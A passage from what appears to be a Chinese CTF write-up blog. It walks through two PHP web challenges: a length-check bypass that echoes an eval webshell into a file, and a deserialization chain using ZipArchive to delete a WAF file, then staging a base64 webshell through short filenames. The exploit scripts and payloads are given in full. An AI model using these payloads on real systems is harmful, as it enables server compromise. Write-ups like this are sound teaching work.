class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入负数即可绕过</p><p><a href="https://imgtu.com/i/671PyQ"><img src="https://z3.ax1x.com/2021/03/23/671PyQ.png" alt="671PyQ.png"></a></p><p>直接echo写马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node4.hackingfor.fun:34567&#x2F;052e4d95576306a511b353cae5aec562&#x2F;?len&#x3D;-1&amp;nep&#x3D;&#96;$_GET[1]&#96;;1&amp;1&#x3D;echo \&lt;?php eval\(\$_POST\[1\]\)\;&gt;2.php</span><br></pre></td></tr></table></figure><p>实际执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo \&lt;?php eval\(\$_POST\[1\]\)\;&gt;2.php</span><br><span class="line">echo eval\(&gt;&gt;2.php</span><br><span class="line">echo \$_POST&gt;&gt;2.php</span><br><span class="line">echo \[1\]&gt;&gt;2.php</span><br><span class="line">echo \)\;&gt;&gt;2.php</span><br></pre></td></tr></table></figure><p>蚁剑连接拿到flag</p><p><a href="https://imgtu.com/i/67lzJf"><img src="https://z3.ax1x.com/2021/03/23/67lzJf.png" alt="67lzJf.png"></a></p><h1 id="梦回牡丹亭"><a href="#梦回牡丹亭" class="headerlink" title="梦回牡丹亭"></a>梦回牡丹亭</h1><p>反序列化</p><p>1.Game类的__destruct方法调用checking 属性choice等于login类,属性username和password等于admin，属性register等于admin</p><p>2.login类的checking方法调用open，这些属性在Game类中赋值：属性file等于Open类，属性filename等于shell.php </p><p>3.最终执行open类的open方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;   <span class="comment">//admin</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">//终点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;     <span class="comment">//</span></span><br><span class="line">    @unserialize(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造exp读取shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Open();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/671Awn"><img src="https://z3.ax1x.com/2021/03/23/671Awn.png" alt="671Awn.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure><p>可以看到必须删除掉waf.txt才能调用shell方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个地方花费了很长时间，一开始的思路是利用伪协议来操作文件，但是伪协议不能做到删除文件。后来想到可以利用同名方法，查php内置类的时候发现ZipArchive类有open方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/671Eoq"><img src="https://z3.ax1x.com/2021/03/23/671Eoq.png" alt="671Eoq.png"></a></p><p><a href="https://imgtu.com/i/671ZF0"><img src="https://z3.ax1x.com/2021/03/23/671ZF0.md.png" alt="671ZF0.md.png"></a></p><p>构造删除文件exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> ZipArchive();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;content=ZipArchive::OVERWRITE;</span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure><p>删除成功</p><p><a href="https://imgtu.com/i/671eYV"><img src="https://z3.ax1x.com/2021/03/23/671eYV.md.png" alt="671eYV.md.png"></a></p><p>接下来可以调用shell方法了，限制长度为10位字符，可以采用追加内容的方式写入shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure><p>为了防止出现&lt;?这种特殊字符，把内容先base64编码后再写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;?php eval($_GET[1]);</span><br><span class="line">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>把文件内容分割后写入到文件名中，因为写入时间顺序的原因所以需要把命令倒序写入，ls -t表示把文件名按照时间排序，把所有文件名写入到0这个文件中，然后sh 0执行echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php写入文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">w&gt;hp</span><br><span class="line">w&gt;1.p\\</span><br><span class="line">w&gt;d\&gt;\\</span><br><span class="line">w&gt;\ -\\</span><br><span class="line">w&gt;e64\\</span><br><span class="line">w&gt;bas\\</span><br><span class="line">w&gt;7\|\\</span><br><span class="line">w&gt;XSk\\</span><br><span class="line">w&gt;Fsx\\</span><br><span class="line">w&gt;dFV\\</span><br><span class="line">w&gt;kX0\\</span><br><span class="line">w&gt;bCg\\</span><br><span class="line">w&gt;XZh\\</span><br><span class="line">w&gt;AgZ\\</span><br><span class="line">w&gt;waH\\</span><br><span class="line">w&gt;PD9\\</span><br><span class="line">w&gt;o\ \\</span><br><span class="line">w&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/671uSU"><img src="https://z3.ax1x.com/2021/03/23/671uSU.md.png" alt="671uSU.md.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Open();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;content=<span class="string">&#x27;w&gt;e64\\&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure><p>命令有点长，写了个脚本利用，首先新建二十个php文件，修改content属性为对应的命令，然后生成payload再发起请求</p><p><a href="https://imgtu.com/i/671KlF"><img src="https://z3.ax1x.com/2021/03/23/671KlF.md.png" alt="671KlF.md.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    localurl=<span class="string">&#x27;http://localhost/ctf/1/%d.php&#x27;</span> %i</span><br><span class="line">    r=requests.get(localurl)</span><br><span class="line">    payload=r.text</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">    data=&#123;<span class="string">&#x27;unser&#x27;</span>:payload&#125;</span><br><span class="line">    r=requests.post(url=<span class="string">&#x27;http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/?a[]=1&amp;b[]=2&#x27;</span>,data=data)</span><br><span class="line">    print(r.status_code)</span><br></pre></td></tr></table></figure><p>   拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 